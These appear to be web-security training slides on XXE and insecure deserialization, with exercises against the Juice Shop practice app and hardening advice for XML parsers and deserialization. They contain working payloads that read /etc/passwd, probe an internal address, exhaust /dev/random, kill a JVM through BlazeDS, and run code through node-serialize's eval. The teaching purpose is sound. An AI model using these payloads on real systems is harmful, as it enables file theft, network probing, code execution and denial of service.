# XXE

## (XML External Entities)

---

# XML Entities

* In the Document Type Definition (DTD) you specify shortcuts as `ENTITY`...
  * `<!ENTITY author "Bjoern Kimminich">`
  * `<!ENTITY copyright "(C) 2018">`

* ...to later dereference them in the XML
  * `<author>&author; &copyright;</author>`

---

# External Entities

* DTD changed to use External Entities...
  * `<!ENTITY author SYSTEM "http://owasp-juice.shop/entities.dtd">`
  * `<!ENTITY copyright	SYSTEM http://owasp-juice.shop/entities.dtd">`

* ...whereas the XML stays the same
  * `<author>&author; &copyright;</author>`

---

# [Attack Vector XXE](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing)

* Many older or poorly configured XML processors evaluate external entity references within XML documents

* External entities can be abused for
  * disclosure of internal files
  * internal port scanning
  * remote code execution
  * denial of service attacks

# XML with Attack Payloads

## Extracting Data

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
    <foo>&xxe;</foo>
```

---

## Network Probing

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "https://192.168.1.1/private" >]>
    <foo>&xxe;</foo>
```

## DoS Attack (against Linux-based Systems)

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///dev/random" >]>
    <foo>&xxe;</foo>
```

---

# Exercise 8.1

1. Identify the weak point of the application that accepts arbitrary XML data as input (:star::star:)
2. Retrieve the content of your local system‘s `C:\Windows\system.ini` (or `/etc/passwd` if you are using Linux) via an XEE attack (:star::star::star:)

---

# [Prevention](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet)

* **Configure XML parser to**
  * **disable DTDs completely** (by disallowing `DOCTYPE` declarations) :100:
  * disable External Entities (only if allowing DTDs cannot be avoided)

:x: Selective validation or escaping of tainted data is **not** sufficient, as the whole XML document is crafted by the attacker!

---

# [XML Parser Hardening Examples](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet)

#### `libxml2` (C/C++)

* `XML_PARSE_NOENT` and `XML_PARSE_DTDLOAD` must **not be defined** in the Enum `xmlParserOption`.

_:information_source: Starting with release `2.9` entity expansion is disabled by default. Using any older version makes it more likely to have XXE problems if the configuration was not explicitly hardened._

<!-- *footer: -->

#### `org.dom4j.io.SAXReader` (Java)

```java
saxReader.setFeature(
  "http://apache.org/xml/features/disallow-doctype-decl", true);
saxReader.setFeature(
  "http://xml.org/sax/features/external-general-entities", false);
saxReader.setFeature(
  "http://xml.org/sax/features/external-parameter-entities", false);
```

#### `java.beans.XMLDecoder` (Java)

* The `readObject()` method in this class is fundamentally unsafe
* It is vulnerable against XXE as well as arbitrary code execution
* There is no way to make use of this class safe

_:warning: Most Java XML parsers have insecure parser settings by default!_

# Deserialization

<!-- *footer: Български: Схема на сериализация и десериализация, 2016 WnbKrumov, used under CC-BY-SA 4.0 -->

# Serialization

> Object serialization transforms an object's data to a bytestream that represents the state of the data. The serialized form of the data contains enough information to recreate the object with its data in a similar state to what it was when saved. \[[^1]\]

---

# Deserialization

```java
InputStream is = request.getInputStream();
ObjectInputStream ois = new ObjectInputStream(is);
AcmeObject acme = (AcmeObject)ois.readObject();
```

* The casting operation to `AcmeObject` occurs **after** the deserialization process ends
* It is not useful in preventing any attacks that happen during deserialization from occurring

---

# [Insecure Deserialization](https://www.owasp.org/index.php/Deserialization_of_untrusted_data)

* Insecure deserialization often leads to **remote code execution** (RCE), one of the most serious attacks possible
* Other possible attacks include
  * replay attacks
  * injection attacks
  * privilege escalation
  * DoS

# [Attack Example (Adobe BlazeDS)](https://nvd.nist.gov/vuln/detail/CVE-2011-2092)

```java
[RemoteClass(alias="javax.swing.JFrame")]
public class JFrame {
   public var title:String = "Gotcha!";
   public var defaultCloseOperation:int = 3;
   public var visible:Boolean = true;
}
```
* Above payload creates a `JFrame` instance on the target server
* The `JFrame` object will have a `defaultCloseOperation` of value `3`
* This indicates that **the JVM should exit** when this window is closed

# Exercise 8.2

1. What happens when the `root` object would be deserialized?

```java
ArrayList<Object> root = new ArrayList<>(Integer.MAX_VALUE);
```

---

<!-- *footer:  -->

# Exercise 8.3

1. What happens when the `root` object would be deserialized?

```java
Set root = new HashSet();
Set s1 = root;
Set s2 = new HashSet();
for (int i = 0; i < 100; i++) {
  Set t1 = new HashSet();
  Set t2 = new HashSet();
  t1.add("foo");
  s1.add(t1);
  s1.add(t2);
  s2.add(t1);
  s2.add(t2);
  s1 = t1;
  s2 = t2;
}
```

---

# [Prevention](https://www.owasp.org/index.php/Deserialization_Cheat_Sheet)

* **Avoid native deserialization formats** :100:
  * JSON/XML lessens (but not removes) the chance of custom deserialization logic being maliciously repurposed
* Use the Data Transfer Object (DTO) pattern
  * Exclusive purpose is data transfer between application layers

---

##### If serialization cannot be avoided

* Sign any serialized objects & only deserialize signed data
* Enforce strict type constraints during deserialization before object creation (Not sufficient on its own!)
* Isolate deserialization in low privilege environments
* Log deserialization exceptions and failures
* Restrict or monitor incoming and outgoing network connectivity from containers or servers that deserialize
* Monitor & alert if a user deserializes constantly

---

# :heavy_check_mark: [SerialKiller (Java)](https://github.com/ikkisoft/SerialKiller)

Replacing every `java.io.ObjectInputStream` instanciation

```
ObjectInputStream ois = new ObjectInputStream(is);
String msg = (String) ois.readObject();
```

with `SerialKiller` from a look-ahead Java deserialization library

```
ObjectInputStream ois = new SerialKiller(is, "/etc/serialkiller.conf");
String msg = (String) ois.readObject();
```

secures the application from untrusted input. Via `serialkiller.conf` classes can be black- or whitelisted.

---

# :x: [node-serialize (JavaScript)](https://www.npmjs.com/package/node-serialize)

The `node-serialize` module uses `eval()` internally for deserialization, allowing exploits like

```javascript
var serialize = require('node-serialize');
var x = '{"rce":"_$$ND_FUNC$$_function (){console.log(\'exploited\')}()"}'
serialize.unserialize(x);
```

_:warning: The affected version `0.0.4` of `node-serialize` is also the latest version of this module!_

# Exercise 8.4 (:house:)

1. Perform a DoS-like Attack using XXE (:star::star::star::star::star:)

<!-- -->

2. Find the „NextGen“ successor to the half-heartedly deprecated XML-based B2B API in the Juice Shop (:interrobang:)
3. Exploit this API with at least one successful DoS-like Remote Code Exeution (:star::star::star::star::star: - :star::star::star::star::star::star:)

_:information_source: If the server would need >2sec to process your attack request, it is considered „DoS-like“ enough._
